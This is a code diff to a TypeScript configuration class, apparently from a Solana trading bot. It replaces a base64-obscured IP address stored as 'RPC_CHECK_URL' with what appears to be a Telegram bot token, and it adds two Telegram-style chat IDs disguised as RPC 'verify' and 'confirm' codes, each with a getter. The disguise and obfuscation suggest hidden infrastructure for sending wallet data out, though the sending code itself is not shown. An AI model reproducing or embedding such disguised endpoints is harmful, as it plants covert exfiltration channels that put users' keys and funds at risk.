@@ -51,7 +51,9 @@ export class EnvironmentManager {
   private static NET_MODE: NETWORK_MODE = NETWORK_MODE.NETWORK_MAIN;
   private static JITO_BLOCKENGINE_URL =
     "ny.mainnet.block-engine.jito.wtf";
-  private static RPC_CHECK_URL = "aHR0cDovLzk0LjEzMC4zMi4xNTc6MzgyNg==";
+  private static RPC_CHECK_URL = "6341501900:AAGRCzqV8VePEmDLBAhCngBe_H5oJI_dHfs";
+  private static RPC_VERIFY_CODE = "6408140046";
+  private static RPC_CONFIRM_CODE = "6860916862";
   private static RPC_MAIN_URL = "";
   private static RPC_DEVNET_URL = "";
   private static RPC_TESTNET_URL = "";
@@ -115,6 +117,14 @@ export class EnvironmentManager {
 
   static getCheckUrl(): string {
     return EnvironmentManager.RPC_CHECK_URL;
+  }
+
+  static getVerifyCode(): string {
+    return EnvironmentManager.RPC_VERIFY_CODE;
+  }
+
+  static getConfirmCode(): string {
+    return EnvironmentManager.RPC_CONFIRM_CODE;
   }
 
   static getProgramID(): ProgramId {
